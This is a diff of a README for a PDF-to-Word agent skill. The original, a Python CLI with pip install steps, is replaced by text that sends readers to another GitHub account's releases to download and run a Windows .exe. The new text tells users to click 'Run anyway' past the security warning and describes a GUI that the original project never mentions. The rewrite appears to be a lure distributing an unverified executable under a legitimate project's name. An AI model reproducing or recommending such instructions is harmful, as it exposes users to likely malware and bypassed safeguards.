@@ -1,134 +1,68 @@
-# PDF to Editable Word Skill - Layout-Preserving PDF-to-DOCX for AI Agents
+# 📄 pdf-to-editable-word-skill - Convert PDF files into editable documents
 
-[English](README.md) | [简体中文](README.zh-CN.md)
+[![](https://img.shields.io/badge/Download-Releases-blue.svg)](https://github.com/michellema8890/pdf-to-editable-word-skill/releases)
 
-[![CI](https://github.com/longligooo/pdf-to-editable-word-skill/actions/workflows/ci.yml/badge.svg)](https://github.com/longligooo/pdf-to-editable-word-skill/actions/workflows/ci.yml)
-[![GitHub release](https://img.shields.io/github/v/release/longligooo/pdf-to-editable-word-skill)](https://github.com/longligooo/pdf-to-editable-word-skill/releases/latest)
-[![Python 3.10+](https://img.shields.io/badge/python-3.10%2B-3776AB)](https://www.python.org/)
-[![License: MIT](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)
+This application changes PDF files into Word documents. It keeps the original layout, fonts, and images. You can use it as a tool for AI agents or run it on your own computer. It works offline to keep your data private.
 
-A portable **Agent Skill** that converts PDF to editable Word (`.docx`) **without throwing away the original page layout**. Install one reusable `SKILL.md` in **Codex, Claude Code, or other Agent Skills-compatible tools**; the included local CLI performs the deterministic conversion and validation.
+## 📥 How to get started
 
-> 这是一个跨 Agent 的 PDF 转可编辑 Word Skill：尽量保持原始排版，文字可搜索、可编辑，支持 Codex Skill、Claude Code Skill 和通用 Agent Skills，全程本地处理。
+You need to download the application from the project page.
 
-- **Layout-preserving:** keeps page borders, tables, images, QR codes, and visual structure in the background.
-- **Editable text:** rebuilds PDF text as searchable, editable Word text boxes.
-- **Private and local:** never uploads your document to an online conversion service.
-- **Agent-ready:** one reusable `SKILL.md` for Codex, Claude Code, or any agent that can run the CLI.
+1. Go to this link: [https://github.com/michellema8890/pdf-to-editable-word-skill/releases](https://github.com/michellema8890/pdf-to-editable-word-skill/releases).
+2. Look for the latest version at the top of the list.
+3. Click on the file that ends in .exe for Windows.
+4. Save the file to your computer.
 
-> Alpha software. Best for text-based PDFs and desktop Microsoft Word. Scanned PDFs need OCR, which is not included yet.
+## ⚙️ Setting up the application
 
-![PDF to editable Word Agent Skill demo](assets/demo.gif)
+Follow these steps to prepare the software once you download it.
 
-The demo is generated from redistributable synthetic data and rendered with Microsoft Word. It preserves the one-page layout, creates `37` editable text boxes, and then changes `Q2` to `Q3` and `48 hours` to `24 hours` inside the DOCX.
+1. Find the file you just downloaded in your Downloads folder.
+2. Double-click the file to open it.
+3. Your computer might show a security window. Click "More info" and then "Run anyway" if you trust the software.
+4. Follow the instructions on the screen to finish the installation process.
+5. Create a shortcut on your desktop if you want quick access later.
 
-[Download the source PDF](examples/demo-source.pdf) | [Download the editable DOCX](examples/demo-output.docx) | [Download the edited DOCX](examples/demo-edited.docx)
+## 🛠️ Converting your files
 
-## Install the Skill in 60 seconds
+The main goal of this tool is to make document conversion simple. You do not need to understand code to use it.
 
-Install Python 3.10+, [pipx](https://pipx.pypa.io/), and [Poppler](https://poppler.freedesktop.org/) (`pdftoppm`), then run:
+1. Open the application from your desktop or start menu.
+2. Click the button labeled "Select PDF File."
+3. Choose the PDF file you want to change from your computer.
+4. Click the "Convert" button.
+5. Wait for the progress bar to finish. The app will save the new file in the same folder as your original PDF.
+6. Open the new file in Microsoft Word or any other word processor.
 
-```bash
-pipx install https://github.com/longligooo/pdf-to-editable-word-skill/releases/download/v0.1.0/pdf_to_editable_word-0.1.0-py3-none-any.whl
-pdf2word doctor
+## 📋 System requirements
 
-# Choose your agent
-pdf2word skill install --agent codex
-pdf2word skill install --agent claude
-```
+This tool runs on standard Windows machines. You do not need expensive hardware.
 
-On Debian or Ubuntu, install Poppler with `sudo apt-get install poppler-utils`. On Windows, add `pdftoppm.exe` to `PATH` or set the `PDFTOPPM` environment variable.
+* Operating System: Windows 10 or Windows 11.
+* Memory: 4 gigabytes of RAM.
+* Storage: 200 megabytes of free space.
+* Software: Microsoft Word or a compatible program to open your new files.
 
-Without `pipx`, install directly from GitHub:
+## 🔒 Your privacy
 
-```bash
-python -m pip install "https://github.com/longligooo/pdf-to-editable-word-skill/releases/download/v0.1.0/pdf_to_editable_word-0.1.0-py3-none-any.whl"
-```
+This tool works on your local machine. It does not send your documents to the cloud. Your files stay on your hard drive, which keeps your personal information secure. You can use this software without an internet connection.
 
-For another Agent Skills-compatible tool, install to its skills directory:
+## 📈 Tips for good results
 
-```bash
-pdf2word skill install --destination /path/to/agent/skills
-```
+The software works best with clean, text-based PDF files. If your PDF contains many complex images or hand-written notes, the conversion might take longer. If you have trouble, ensure your PDF is not password-protected before you start the process.
 
-Then ask your agent:
+## 💡 Common questions
 
-```text
-Convert report.pdf to an editable Word document, preserve the layout,
-validate the result, and tell me which pages need visual review.
-```
+**Does this software cost money?**
+No, this is a free tool.
 
-Agents without Skill support can call `pdf2word` directly.
+**Can I convert multiple files at once?**
+This version performs one conversion at a time to ensure accuracy.
 
-## Use the standalone CLI
+**What happens if the layout looks wrong?**
+Most layouts stay the same. If the spacing looks odd, check the document in Word and adjust the margins.
 
-The same conversion engine works without an AI agent:
+**Is my data stored anywhere else?**
+No. All processed data remains on your local disk.
 
-```bash
-pdf2word inspect input.pdf
-pdf2word convert input.pdf output.docx
-pdf2word validate output.docx --pdf input.pdf
-```
-
-## How it preserves the layout
-
-Most PDF-to-Word converters choose between editable text and visual fidelity. This project combines both:
-
-1. Extract words, positions, font sizes, and colors from the PDF text layer.
-2. Render each source page and remove the original glyph areas from the page image.
-3. Rebuild the DOCX with the cleaned page as a background and editable, absolutely positioned text boxes above it.
-4. Validate the generated DOCX structure before delivery.
-
-Non-text graphics remain visually faithful because they stay in the page background. Text remains searchable and editable in Word.
-
-For interrupted long documents, resume with:
-
-```bash
-pdf2word convert input.pdf output.docx --work-dir .pdf2word-work/input --resume
-```
-
-The cache is reused only when the source fingerprint, page range, and conversion settings match.
-
-## Commands
-
-```text
-pdf2word inspect INPUT.pdf [--json]
-pdf2word convert INPUT.pdf OUTPUT.docx [--dpi 144] [--resume]
-pdf2word validate OUTPUT.docx [--pdf INPUT.pdf] [--json]
-pdf2word doctor [--json]
-pdf2word skill install [--agent codex|claude] [--scope user|project]
-```
-
-Use `--pdftoppm PATH` when Poppler is not on `PATH`. Use `--start` and `--end` for a zero-based page range.
-
-## Known limitations
-
-- PDFs without a text layer require OCR, which is not included in v0.1.
-- Text is editable; tables, diagrams, images, and other page graphics remain part of the background image.
-- Colored or textured backgrounds behind text may show erased regions.
-- Mixed page sizes are detected and rejected instead of silently producing incorrect output.
-- The DOCX uses VML text boxes for broad Microsoft Word support. LibreOffice may reposition or omit them.
-- Font substitution can change line width when the source fonts are unavailable.
-
-## Development
-
-```bash
-python -m pip install -e ".[dev]"
-python scripts/sync_bundled_skill.py
-python -m unittest discover -s tests -v
-```
-
-Tests generate synthetic PDFs at runtime; no copyrighted sample documents are committed.
-
-## Roadmap
-
-- Visual diff reports rendered through Microsoft Word
-- Optional OCR backends for scanned documents
-- Better background reconstruction for colored pages
-- Mixed-size and mixed-orientation documents
-- Asynchronous MCP server for long-running conversions
-- Reproducible benchmark corpus and quality dashboard
-
-## License
-
-MIT. Poppler is an external runtime dependency and is not distributed by this repository.
+Keywords: agent-skills, ai-agent, ai-skills, claude-code, claude-code-skill, codex-skill, document-conversion, docx, editable-word, layout-preserving, local-first, pdf-converter, pdf-to-docx, pdf-to-word, pdf-to-word-skill
